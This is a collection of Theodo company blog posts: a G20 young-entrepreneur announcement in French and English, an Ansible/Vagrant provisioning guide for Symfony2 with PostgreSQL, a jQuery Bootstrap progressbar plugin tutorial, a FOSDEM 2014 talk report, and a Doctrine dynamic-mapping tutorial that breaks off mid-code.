{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nLe directeur ex\u00e9cutif et co-fondateur de Theodo,  Beno\u00eet Charles-Lavauzelle , a \u00e9t\u00e9 s\u00e9lectionn\u00e9 pour repr\u00e9senter les entrepreneurs fran\u00e7ais au Sommet du G20 des entrepreneurs. Celui-ci aura lieu du 18 au 22 juillet prochains en Australie. Au sein d\u2019un panel de jeunes entrepreneurs fran\u00e7ais parmi les plus dynamiques, il rencontrera des entrepreneurs venus des autres Etats membres du G20. L\u2019objectif est de partager les meilleures pratiques et de produire des recommandations pour favoriser l\u2019entrepreneuriat.\nL\u2019Alliance des Jeunes entrepreneurs du G20 (G20 YEA) est un collectif qui promeut l\u2019entrepreneuriat des jeunes comme facteur de renouvellement \u00e9conomique, de cr\u00e9ation d\u2019emplois, d\u2019innovation et d\u2019\u00e9volutions sociales. Le G20 YEA tient un sommet annuel pr\u00e9alable aux Sommets du G20 et du B20 (le Business 20) regroupant des grands Leaders politiques et \u00e9conomiques. Le but du G20 YEA Summit est de favoriser l\u2019entrepreneuriat en avancant des recommandations au B20 et au G20 et d\u2019agir effectivement selon ces recommandations dans l\u2019activit\u00e9 quotidienne. \nTheodo est donc particuli\u00e8rement fier d\u2019y participer cette ann\u00e9e pour y d\u00e9fendre les valeurs de l\u2019agilit\u00e9, la qualit\u00e9 de l\u2019expertise web en France et rentrer la t\u00eate pleine d\u2019id\u00e9es nouvelles !\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAntoine Haguenauer\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tAnsible is a IT automation tool very popular on GitHub. It\u2019s written in Python and has been designed to be simple to use.\nThis article explains how we have created an Ansible provisioning for a Symfony2 project working with a Postgresql database. This Ansible playbook has been tested with Vagrant 1.3.5 and Ansible 1.3.3. The goal of this playbook is to provide a simple Ansible provisioning of a Ubuntu VM to run a Symfony2 project.\nWe will show you some useful commands that we used on our Ubuntu 12.04 LTS. We let users of other OS translate the commands.\nSTART A SYMFONY2 PROJECT WITH ANSIBLE\nThe use of this repository is very easy and needs only those steps.\n1. Before you start you need to have Vagrant and Ansible installed on your machine.\nYou can download vagrant here: http://www.vagrantup.com/downloads.html\nYou can find Ansible here: http://docs.ansible.com/intro_installation.html or simply install it with\n\n $ apt-get install ansible\r\n\n2. If you haven\u2019t yet, it\u2019s time to clone the repository:\n\n$ git clone git@github.com:MaximeThoonsen/ansible-devops.git\r\n\n3. Update your /etc/hosts file or your OS equivalent and add the future ip of the VM: \u201c199.199.199.51  dev-myapphost\u201d\n4. Add your ssh public key in the provisioning by editing the /files/var/www/.ssh/authorized_keys file\n5. Now you are good to create the VM:\n$ vagrant up --provision\nIf the VM is up and running but the provision hasn\u2019t been done, you can do:\n$ vagrant provision \nIf some errors occur look at the lists of common errors at the end of this article. You have to wait 5-15 minutes the time for the vm to upgrade and install everything.\n6. It\u2019s ready! You should be able to see it at http://dev-myapphost\n\nHOW TO CUSTOMIZE YOUR ANSIBLE PROVISIONING\nI\u2019ll start with a brief explanation of the purpose of each directory of the provisioning.\n1. \u201cgroup_vars\u201d: This directory is used for the definition of most of the few useful variables. They are used in all the other files for the configuration of the VM.\n2. The \u201cfiles\u201d directory copy the file with no change into the VM\u2019s system. It\u2019s an easy way to provide some configuration.\n3. The \u201ctemplates\u201d directory is also for copying file but this time, as you may have guessed, you can use variables to create them dynamically. It contains the nginx\u2019s configuration template which uses some variables defined in the group_vars/all file.\n4. The \u201chosts\u201d is used to define variables for the use of different deployment environments (staging, production, ..)\n5. The \u201croles\u201d directory contains the commands used to install all the required packages. (Postgres,git,vim, ..)\nHOW TO INSTALL POSTGRESQL WITH ANSIBLE\nThe file that describes the needed ansible commands can be found at roles/backend/tasks/postgresql.yml\nAnsible has to download the key of the repository for your VM\u2019s OS. For ubuntu, you can find the postgres package\u2019s key here. Adapt the following url or command to your OS using the ansible documentation and the postgres download page.\n - name: postgresql - add repository key\r\n  apt_key: url=https://www.postgresql.org/media/keys/ACCC4CF8.asc state=present\r\n\nThen you can add the repository.\n- name: postgresql - add official postgresql repository\r\n  apt_repository: repo=\"deb http://apt.postgresql.org/pub/repos/apt/ precise-pgdg main\" state=present\r\n\nYou can generate the locale you want to use in the database with the following commands (works on ubuntu):\n- name: postgresql - add locale\r\n  lineinfile: dest=/etc/locale.gen create=yes line=\"fr_FR.UTF-8 UTF-8\" regexp=\"^fr_FR.UTF-8\" insertafter=EOF\r\n\r\n- name: postgresql - regen locales\r\n  command: /usr/sbin/locale-gen\r\n\nYou can finally install the package and configure the db. The database will be created with the app.name defined in the group_vars file. It\u2019s the same for the user and the password. You can change the variables, create new ones or directly put the values you want in the ansible commands\n- name: postgresql - install version 9.3\r\n  apt: pkg=postgresql-9.3 state=latest update_cache=yes\r\n\r\n- name: postgresql - create db\r\n  sudo_user: postgres\r\n  postgresql_db: name=\"{{ app.name }}\" encoding=\"UTF-8\" lc_collate=\"fr_FR.UTF-8\" lc_ctype=\"fr_FR.UTF-8\" template='template0'\r\n\r\n- name: postgresql - create user\r\n  sudo_user: postgres\r\n  postgresql_user: db={{ app.name }} user={{ app.name }} password={{ app.name }}\r\n\r\n- name: postgresql - apply privileges\r\n  sudo_user: postgres\r\n  postgresql_privs: db={{ app.name }} privs=ALL type=database role={{ app.name }}\r\n\r\n- name: postgresql - install postgresql-contrib-9.3 --needed for fulltextsearch\r\n  apt: pkg=postgresql-contrib-9.3 state=latest update_cache=yes\r\n\nThanks to Nicolas for his precious help!\n\nList of common errors\nThe guest machine entered an invalid state while waiting for it\r\nto boot. Valid states are 'starting, running'. The machine is in the\r\n'poweroff' state. Please verify everything is configured\r\nproperly and try again.\r\n\nYou may have to enable the virtualization in the bios of your machine.\n\r\nfatal: [www-data@dev-myapphost] => SSH encountered an unknown error during the connection. We recommend you re-run the command using -vvvv, which will enable SSH debugging output to help troubleshoot the issue\r\n\nYou may have not specify the IP of your VM.\n1) update your /etc/hosts file and enter the ip of your vm (like:\u201d199.199.199.51  dev-myapphost\u201d)\n2) add your key in the provisioning in provisioning/files/var/www/.ssh/authorized_keys\nList of common warnings\n...util/which.rb:32: warning: Insecure world writable dir /usr/local/bin in PATH, mode 040777\nA potential solution\n$ chmod go-w /usr/local/bin/\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMaxime Thoonsen\r\n  \t\t\t\r\n  \t\t\t\tEducation Hacker. Full Stack developer - Agile and Lean Coach\r\nTwitter: https://twitter.com/maxthoon\r\nGithub: https://github.com/MaximeThoonsen  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tBootstrap was created at Twitter in mid-2010 by @mdo and @fat. It provides a lot of UI plugins easy to implement. You\u2019ve probably already used it but have you looked at how it worked? Together, we will try to make another plugin using the same best practices as Twitter. Through this tutorial I will introduce some JavaScript concepts like prototype, data-api or object-oriented programming.\nA great way to learn is to work on a concrete example so you will build a jQuery plugin in order to manipulate a Bootstrap progressbar.\nSee the Pen Bootstrap Progressbar by Jonathan (@jbeurel) on CodePen.\n\nGit: The code used in this tutorial is available on GitHub. You can follow the process step by step by using git tags:\n\nClone the bootstrap-progressbar-tuto repository:\ngit clone https://github.com/jbeurel/bootstrap-progressbar-tuto.git\r\n\n\nChange your current directory to bootstrap-progressbar-tuto\ncd bootstrap-progressbar-tuto\r\n\nThis is your working directory for the rest of this tutorial\nYou can already see the rendering by opening the index.html file in your web browser\n\nstep-0: The DOM\nGit: This command resets your working directory to the step 0 of the tutorial:\ngit checkout -f step-0\r\n\nLet\u2019s begin by using basically the Bootstrap Progressbar:\n<html>\r\n<head>\r\n    <title>Bootstrap Progress Bar</title>\r\n    <link rel=\"stylesheet\" href=\"//netdna.bootstrapcdn.com/bootstrap/3.0.0/css/bootstrap.min.css\">\r\n</head>\r\n<body>\r\n    <div class=\"container\">\r\n        <h1>Bootstrap Progress Bar</h1>\r\n\r\n        <div class=\"progress\">\r\n          <div class=\"progress-bar\" role=\"progressbar\" aria-valuenow=\"40\" aria-valuemin=\"0\" aria-valuemax=\"100\" style=\"width: 40%;\">\r\n            <span class=\"sr-only\">40% Complete</span>\r\n          </div>\r\n        </div>\r\n    </div>\r\n\r\n    <script src=\"//code.jquery.com/jquery.js\"></script>\r\n    <script src=\"//netdna.bootstrapcdn.com/bootstrap/3.0.0/js/bootstrap.min.js\"></script>\r\n</body>\r\n</html>\r\n\nYou\u2019ve created a simple template that includes Bootstrap assets and displays the static progressbar example provided by Bootstrap\nGit: Code Diff\nstep-1 \u2013 The jQuery plugin\nGit: Reset the workspace to step 1:\ngit checkout -f step-1\r\n\nNext step: Javascript!\nCreate a new js/progressbar.js file with this code:\n!function ($) {\r\n\r\n    \"use strict\";\r\n\r\n    // PROGRESSBAR CLASS DEFINITION\r\n    // ============================\r\n\r\n    var Progressbar = function (element) {\r\n        this.$element = $(element);\r\n    }\r\n\r\n    // PROGRESSBAR PLUGIN DEFINITION\r\n    // =============================\r\n\r\n    $.fn.progressbar = function (option) {\r\n        return this.each(function () {\r\n            var $this = $(this),\r\n                data = $this.data('jbl.progressbar');\r\n            if (!data) $this.data('jbl.progressbar', (data = new Progressbar(this)));\r\n        })\r\n    };\r\n\r\n}(window.jQuery);\r\n\nWhat is the code doing?\n\nIIFE (Immediately-Invoked Function Expression):\n!function ($) {\r\n}(window.jQuery);\r\n\nThe ! converts the function declaration to a function expression and allows to invoke it immediatly by adding the (window.jQuery) parentheses. You can find more information on this Stackoverflow thread.\nClass definition\nvar Progressbar = function (element) {\r\n    this.$element = $(element);\r\n}\r\n\nThis creates a Progressbar class that contains the DOM element that you\u2019ll be able to manipulate later.\njQuery plugin definition\n$.fn.progressbar = function () {\r\n    return this.each(function () {\r\n        var $this = $(this),\r\n            data = $this.data('jbl.progressbar');\r\n        if (!data) $this.data('jbl.progressbar', (data = new Progressbar(this)));\r\n    })\r\n};\r\n\n$.fn is an alias of the jQuery.prototype. You can use it to extend jQuery with your own progressbar function. You use each DOM element selected by a jQuery selector as a Singleton data storage to store an instance of a Progressbar object.\n\nGit: Code Diff\nstep-2 \u2013 The prototype\nGit: Reset the workspace to step 2:\ngit checkout -f step-2\r\n\nThe next step is to add an update function to your Progressbar to change its value. Methods can be added to a JS class by defining functions as children of the prototype class attribute (see Object.prototype). In this way, add this code to your js/progressbar.js file:\nProgressbar.prototype.update = function (value) {\r\n    var $div = this.$element.find('div');\r\n    var $span = $div.find('span');\r\n    $div.attr('aria-valuenow', value);\r\n    $div.css('width', value + '%');\r\n    $span.text(value + '% Complete');\r\n}\r\n\nThis function changes the values of the aria-valuenow attribute, CSS width and the text. Using it will update all this elements at once. Let\u2019s improve the plugin definition to use your newly created function:\n$.fn.progressbar = function (option) {\r\n    return this.each(function () {\r\n        var $this = $(this),\r\n            data = $this.data('jbl.progressbar');\r\n        if (!data) $this.data('jbl.progressbar', (data = new Progressbar(this)));\r\n        if (typeof option == 'number') data.update(option);\r\n    })\r\n};\r\n\nAdd option parameter to your progressbar function and use it to call the update function. Try out this command in the browser console to test your code:\n$('#myProgressbar').progressbar(20)\r\n\nNice! You can see the Progressbar change.\nGit: Code Diff\nstep-3 \u2013 The use case\nGit: Reset the workspace to step 3:\ngit checkout -f step-3\r\n\nYour plugin is technically working, but how do you want to use it ? The Bootstrap style answer is to call it from your HTML markup. Update the index.html file by adding this HTML:\n<p>\r\n    <button data-toggle=\"progressbar\" data-target=\"#myProgressbar\" data-value=\"0\" class=\"btn btn-default\">0%</button>\r\n    <button data-toggle=\"progressbar\" data-target=\"#myProgressbar\" data-value=\"10\" class=\"btn btn-default\">10%</button>\r\n    <button data-toggle=\"progressbar\" data-target=\"#myProgressbar\" data-value=\"30\" class=\"btn btn-default\">30%</button>\r\n    <button data-toggle=\"progressbar\" data-target=\"#myProgressbar\" data-value=\"75\" class=\"btn btn-default\">75%</button>\r\n    <button data-toggle=\"progressbar\" data-target=\"#myProgressbar\" data-value=\"100\" class=\"btn btn-default\">100%</button>\r\n</p>\r\n\n\ndata-toggle=\"progressbar\" allows to mark this button as a Progressbar toggler.\ndata-target=\"#myProgressbar\" determines which Progressbar is updated by this button.\ndata-value=\"0\" defines next value of the Progressbar.\n\nThis HTML is the contract that you will try to honor in the next step.\nGit: Code Diff\nstep-4 \u2013 The DATA-API\nGit: Reset the workspace to step 4:\ngit checkout -f step-4\r\n\nFor each click on a button, you will use the jQuery object data-api to collect the information needed by the plugin:\n// PROGRESSBAR DATA-API\r\n// ====================\r\n\r\n$(document).on('click', '[data-toggle=\"progressbar\"]', function (e) {\r\n    var $this = $(this);\r\n    var $target = $($this.data('target'));\r\n    var value = $this.data('value');\r\n    e.preventDefault();\r\n    $target.progressbar(value);\r\n});\r\n\nThis listener is added to the progressbar.js file and listens to all the buttons in the application containing the data-toggle=\"progressbar\" attribute. Finally, update the Progressbar with the correct value.\nGit: Code Diff\nstep-5 \u2013 The optional functions\nGit: Reset the workspace to step 5:\ngit checkout -f step-5\r\n\nYour Progressbar jQuery plugin works! Last exercise to improve it. How could you use this new button?\n<button data-toggle=\"progressbar\" data-target=\"#myProgressbar\" data-value=\"reset\" class=\"btn btn-default\">Reset</button>\r\n\ntypeof javascript function allows to treat differently an integer and a string passed to the the data-value attribute and calls the correct function:\nif (typeof option == 'string') data[option]();\r\n\nThis line added to the plugin definition allows to call this function:\nProgressbar.prototype.reset = function () {\r\n    this.update(0);\r\n}\r\n\nThe plugin definition is now ready to accept some improvements. You can simply add a new function to the plugin and call it by passing its name to the data-value attribute. It has never been easier to add a finish function. In the progressbar.jsfile:\nProgressbar.prototype.finish = function () {\r\n    this.update(100);\r\n}\r\n\nIn the template:\n<button data-toggle=\"progressbar\" data-target=\"#myProgressbar\" data-value=\"finish\" class=\"btn btn-default\">Finish</button>\r\n\nWorks like a charm, doesn\u2019t it?\nGit: Code Diff\nConclusion\nThis code, inspired by Bootstrap plugins, was to show you how to create a jQuery plugin using a Javascript object, its prototype and communicate between DOM element through the jQuery data-api.\nI hope you read this tutorial with interest. Don\u2019t hesitate to comment for any questions or suggestions!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tJonathan Beurel\r\n  \t\t\t\r\n  \t\t\t\tJonathan Beurel - Web Developer. Twitter : @jonathanbeurel  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nOn the 1st & 2nd of February 2014, Brussels became the place where to learn and to train for a plethora of tech-savvy women, men and robots. It was all about this year\u2019s new edition of FOSDEM, which took place once again at the ULB (Universit\u00e9 Libre de Bruxelles) Solbosch Campus for openness\u2019s sake.\nSince I really enjoyed spending these two days there, surrounded by thousands of geeks litterally, I\u2019ve decided to write this article to encourage the readers to plan the trip with enough time upfront for the upcoming editions (especially as access to all tracks is free as in free beer!).\nWith over 7k visitors attending half of a thousand tracks, the IPv6 installation was totally worthwhile and held solid until the end. Seriously, when was the last time, you didn\u2019t have irreversible issues with wireless networks when attending some event?\nThough I personally had no choice in connecting to the double stack network from time to time, the sole availability of the latter is a perfect reminder of all the care, the volunteers donated all along these two days. The huge success reached on this weekend also proves how institutions and public commonalities can be put to use in developing even more synergy within existing and yet-to-be-built open source project communities.\nSecurity\nBy pointing me at an article posted on the Tor project blog few months ago, Nicolas Bazire drew my attention to deterministic builds. One of the many risks incurred by core OSS project contributors, would be to have a single compromised machine, becoming susceptible of infecting millions of others in a snowball effect. J\u00e9r\u00e9my Bobbio (Debian maintainer) decided to work from there with a clear mission statement asserting that It should be possible to reproduce, byte for byte, every build of every package in Debian.\nThis is what led me to one of the first sessions in the distributions devroom of this Saturday morning,\nwhere J\u00e9r\u00e9my Bobbio a.k.a. Lunar at debian dot org, explained how this goal could be achieved by\n\nrecording the build environment,\nreproducing the build environment,\neliminating unneeded variations.\n\n\nProvided that most of the unneeded variations originate from\n\ntimestamps, \nbuild path, \nhostname, username, uname, \nfiles list order.\n\nThe beginning of a solution would consist in\n\nsharing a standard virtual machine, \ninstalling packages from snapshots.debian.org \n\napplying plenty of other smart tricks as described on the reference wiki like\n\npassing \u201c\u2013enable-deterministic-archives\u201d to binutils, \ntimestamps with environment variables, \npatching gzip,\ntaking benefit of stable file list in archives.\n\n\n\nBy the time of the conference, Lunar had achieved a 62% success rate with 3196 packages out of 5151 which can be built in a deterministic way i.e. with same checksums obtained for same binaries.\nHe insisted on the fact this can only be part of the solution and not a unique solution to improve the overall security of the build toolchain.\nLunar also called for contributors (targeting the PHP registry among many others for Debian) to extend the current coverage, as himself started to work on this project at DebConf2013, which now requires more hands.\nAnybody interested in security in general, closely related to Debian and other distributions or willing to contribute, can subscribe to the official Reproducible builds mailing list.\nMozilla Track\nIn the Mozilla track, Srikar Ananthula described how Mozilla Persona can be a better way to sign-in with no need to store passwords, nor to rely on third-parties.\nMozilla WebMakers is already relying on it and lots of existing libraries and plugins already implement the Browser Id protocol.\n\nFabien Cazenave shedded some lights on The state of Firefox OS.\nAccording to Kaz\u00e9, the days of \u201cFlash and Retry\u201d experience are over (mostly).\nNow that a healthy 12 week release cycle has been established, new web APIs are coming with:\n * DataStore API\n * Shared workers\nA reference device (InFocus 10\u2033, 1280\u00d7800x24bit, 16GB Storage, 2GB RAM) has been selected to build FirefoxOS on tablets.\nAs a result, developers will very soon be able to sign up for participating to the contribution program.\nLegal and policy issues\nBesides, I had the pleasure to attend my first conference on legal and policy issues with John Sullivan (executive director of the free software foundation) with \u201cJavaScript, If you love it, set it free\u201c. After recalling some of the biggest recent successes of the foundation (sales of the Gluglug X60 as one of the computers being endorsed to respect our freedom), he proposed a couple of implementations to address the issue of licencing JavaScript code served by websites.\nThe basic freedom checklist requires\n\nlicence notice and possibly a copy of the free licence, \ncomplete source code (i.e. preferred form of a program for modification).\n\nPrivacy\n\nHave you ever been looking to replace your current webmail? Bjarni R. Einarsson has a more than decent solution to offer.\nAs highlighted in his mailpile introduction, the state of e-mail was kind of stuck in the 90s.\nProvided cloudy email is worse for freedom than closed source, mailpile team decided to focus on\n\nmaking software, FOSS folks enjoy\n\nhacking on,\nwant to use ;\n\n\nmaking e-mail encryption understandable,\nmake decentralization easy,\nfind better business models for e-mail. \n\nA very neat web interface has been crafted by MailPile team.\nMailpile alpha version has been released with PGP encryption and signatures and search engines.\nMoreover, developers can already play around with a REST API and a command-line interface. Multiple mailbox formats are supported. Spam filters learn from manually tagged emails, messages the user reads, replies to or forwards.\nGraph databases\nIn the morning of the following day, Armando Miraglia (known as a commiter of sshguards) demonstrated the new Giraph APIs for Python, Rexster and Gora. Giraph is used for large scale processing with Hadoop and it is an open-source implementation of Pregel. Armando\u2019s fork supports writing user logic in languages other than Java such as Python.\nDavy Suvee illustrated The power of graphs to analyze biological data with an exploration platform (BRAIN).\nThis platform comes as a stack built to relate 23 million biomedical articles and it can be separated into three distinct layers with:\n\nmeta-data stored with MongoDB,\ngraphs persisted into Neo4J\nend-user interface built with Swing\n\nJavaScript\nEntering the JavaScript devroom was not trivial but I eventually managed to get a seat there. From what I have heard, it was the first time, JavaScript has its fully dedicated room at FOSDEM appart from the Mozilla tracks.\nRobert Kowalski mentioned useful subcommands to execute with npm like config, repo, outdated.\nIn his talk entitled \u201cHidden gems in npm\u201d, he revealed npmd in particular as it provides:\n\noffline search,\noffline publishing with queuing,\nfull caching of installed modules.\n\nAfterwards, Laurent Eschenauer showcased how to pilot AR.Drone in JavaScript.\nThe main principles behind the drones flight automation were exposed:\n\nRemote control API, \nState estimation (or figuring where a drone is),\nMotion control with PID,\nPath planning.\n\nTesting and automation\nLast but not least, Sebastian Bergmann was a speaker at FOSDEM for the first time in the testing and automation developer room.\nHe told us the story of \u201cPride and Prejudice: Testing the PHP World\u201d or introduced how he gave birth to PHPUnit application out of pain \u2013 by delegating the latter to machines using automation.\n\nHopefully, we will have the opportunity to attend the next series of conference at FOSDEM 2015 and we might even meet with some of you there in a crowded devroom.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tthierrym\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nBeno\u00eet Charles-Lavauzelle, the CEO and co-founder of Theodo, has been selected to represent French entrepreneurs at the 2014 G20 Young Entrepreneurs Alliance Summit in Australia on July 18th-22nd. Along with some of the most inspiring young entrepreneurs in France, he will meet peers from other member countries, share best practices and develop recommendations to drive entrepreneurship. \nThe G20 Young Entrepreneurs\u2019 Alliance (G20 YEA) is a collective promoting youth entrepreneurship as a powerful driver of economic renewal, job creation, innovation and social change. The G20 YEA holds an annual Summit prior to the official B20 and G20 Leader\u2019s Summits. Its goal is to foster entrepreneurship, put forward recommendations to the B20 and G20 and action them in their everyday business. \nTheodo is extremely proud to be part of this year\u2019s edition and to be given an occasion to promote agility, the quality of the French web and to find new ideas to keep on getting better at what we do!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAntoine Haguenauer\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t        Dynamic mapping in Doctrine and Symfony: How to extend entities\n    \n\nWhen developing with Symfony2, you may one day want to create an entity that will be used by many other entities in your application, using the exact same relation everytime. Let\u2019s say you create an UploadedDocument entity and you know from the start that you will have to manage uploads in different contexts in the same application (attachments to a blog article, attachments to a user message, etc.). Sure you could manage these contexts manually and copy/paste your ORM definitions everywhere. But that would be wrong\u2026  You should consider ORM mapping information as your code: \"DRY\" and maintainable. What if you have five, ten, fifteen different contexts in your huge application? What if you are ten different developers on this project? Each with their own way to define the mapping (forgetting here or there to define part of the mapping, making it invalid).\nConvinced? Let\u2019s dive into this upload example to explain the basic idea\u2026\n\nFirst a single context example\n\nThe basic UploadedDocument entity\nHere is a very very basic entity we will consider as our UploadedDocument entity.\n\nNote\nAs this article is not focused on the upload process you will not find details on how to manage cleanly a resource upload (for this, refer to the corresponding official documentation resource):\n\n\r\n// src/Acme/DemoBundle/Entity/UploadedDocument.php\r\nclass UploadedDocument\r\n{\r\n    /**\r\n     * @var integer\r\n     */\r\n    protected $id;\r\n\r\n    /**\r\n     * @var string\r\n     */\r\n    protected $name;\r\n\r\n    /**\r\n     * @var string\r\n     */\r\n    protected $path;\r\n\r\n    //Add corresponding getters and setters\r\n}\r\n                    \nNothing fancy as you can see, nonetheless do not forget the corresponding basic mapping (assuming here you use XML):\n\r\n// src/Acme/DemoBundle/Resources/config/doctrine/UploadedDocument.orm.xml\r\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n\r\n<doctrine-mapping\r\n    xmlns=\"http://doctrine-project.org/schemas/orm/doctrine-mapping\"\r\n    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\r\n    xsi:schemaLocation=\"http://doctrine-project.org/schemas/orm/doctrine-mapping\r\n                        http://doctrine-project.org/schemas/orm/doctrine-mapping.xsd\"\r\n>\r\n    <entity name=\"Acme\\DemoBundle\\Entity\\UploadedDocument\"\r\n            table=\"uploaded_document\"\r\n    >\r\n\r\n        <id name=\"id\" type=\"integer\" column=\"id\">\r\n            <generator strategy=\"AUTO\"/>\r\n        </id>\r\n\r\n        <field name=\"name\" type=\"string\" column=\"name\" length=\"150\"/>\r\n\r\n        <field name=\"path\" type=\"string\" column=\"path\" length=\"255\"/>\r\n    </entity>\r\n</doctrine-mapping>\r\n                    \n\n\nThe BlogArticle entity\nYou want to attach documents to a blog article so let\u2019s create the basic BlogArticle entity:\n\r\n// src/Acme/DemoBundle/Entity/BlogArticle.php\r\nclass BlogArticle\r\n{\r\n    /**\r\n     * @var integer\r\n     */\r\n    protected $id;\r\n\r\n    /**\r\n     * @var string\r\n     */\r\n    protected $title;\r\n\r\n    /**\r\n     * @var string\r\n     */\r\n    protected $content;\r\n\r\n    //Add corresponding getters and setters\r\n}\r\n                    \nAnd the corresponding mapping:\n\r\n// src/Acme/DemoBundle/Resources/config/doctrine/BlogArticle.orm.xml\r\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n\r\n<doctrine-mapping\r\n    xmlns=\"http://doctrine-project.org/schemas/orm/doctrine-mapping\"\r\n    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\r\n    xsi:schemaLocation=\"http://doctrine-project.org/schemas/orm/doctrine-mapping\r\n                        http://doctrine-project.org/schemas/orm/doctrine-mapping.xsd\"\r\n>\r\n    <entity name=\"Acme\\DemoBundle\\Entity\\BlogArticle\"\r\n            table=\"blog_article\"\r\n    >\r\n\r\n        <id name=\"id\" type=\"integer\" column=\"id\">\r\n            <generator strategy=\"AUTO\"/>\r\n        </id>\r\n\r\n        <field name=\"title\" type=\"string\" column=\"title\" length=\"150\" />\r\n\r\n        <field name=\"content\" type=\"text\" column=\"content\" />\r\n    </entity>\r\n</doctrine-mapping>\r\n                    \nAs you can see nothing actually relates the BlogArticle entity to the UploadedDocument entity yet. As explained above in this article you could, at this point, decide to write manually your mapping information in this BlogArticle.orm.xml file. The point of this article is to present you another way\u2026\n\n\nThe Dynamic Mapping Event Subscriber\nWe can also define relations using an EventListener or (as shown here) an EventSubscriber:\n\r\n// src/Acme/DemoBundle/EventListener/DynamicRelationSubscriber.php\r\nclass DynamicRelationSubscriber implements EventSubscriber\r\n{\r\n    /**\r\n     * {@inheritDoc}\r\n     */\r\n    public function getSubscribedEvents()\r\n    {\r\n        return array(\r\n            Events::loadClassMetadata,\r\n        );\r\n    }\r\n\r\n    /**\r\n     * @param LoadClassMetadataEventArgs $eventArgs\r\n     */\r\n    public function loadClassMetadata(LoadClassMetadataEventArgs $eventArgs)\r\n    {\r\n        // the $metadata is the whole mapping info for this class\r\n        $metadata = $eventArgs->getClassMetadata();\r\n\r\n        if ($metadata->getName() != 'Acme\\DemoBundle\\Entity\\BlogArticle') {\r\n            return;\r\n        }\r\n\r\n        $namingStrategy = $eventArgs\r\n            ->getEntityManager()\r\n            ->getConfiguration()\r\n            ->getNamingStrategy()\r\n        ;\r\n\r\n        $metadata->mapManyToMany(array(\r\n            'targetEntity'  => UploadedDocument::CLASS,\r\n            'fieldName'     => 'uploadedDocuments',\r\n            'cascade'       => array('persist'),\r\n            'joinTable'     => array(\r\n                'name'        => strtolower($namingStrategy->classToTableName($metadata->getName())) . '_document',\r\n                'joinColumns' => array(\r\n                    array(\r\n                        'name'                  => $namingStrategy->joinKeyColumnName($metadata->getName()),\r\n                        'referencedColumnName'  => $namingStrategy->referenceColumnName(),\r\n                        'onDelete'  => 'CASCADE',\r\n                        'onUpdate'  => 'CASCADE',\r\n                    ),\r\n                ),\r\n                'inverseJoinColumns'    => array(\r\n                    array(\r\n                        'name'                  => 'document_id',\r\n                        'referencedColumnName'  => $namingStrategy->referenceColumnName(),\r\n                        'onDelete'  => 'CASCADE',\r\n                        'onUpdate'  => 'CASCADE',\r\n                    ),\r\n                )\r\n            )\r\n        ));\r\n    }\r\n}\r\n                    \n\nNote\nThe ClassName::CLASS notation appeared in PHP 5.5. For previous PHP versions you could also create a constant in the subscriber with the full qualified namespace to the UploadedDocument Entity (AcmeDemoBundleEntityUploadedDocument) and use this constant instead.\n\nSince a relation has been added to the BlogArticle, Symfony will expect that the corresponding setters and getters exist. This is a limitation of the dynamic mapping, you will still have to define them manually:\n\r\n// src/Acme/DemoBundle/Entity/BlogArticle.php\r\nclass BlogArticle\r\n{\r\n    protected $id;\r\n\r\n    protected $title;\r\n\r\n    protected $content;\r\n\r\n    /**\r\n     * @var ArrayCollection\r\n     */\r\n    protected $uploadedDocuments;\r\n\r\n    // [...]\r\n\r\n    public function addUploadedDocument(UploadedDocument $uploadedDocument)\r\n    {\r\n        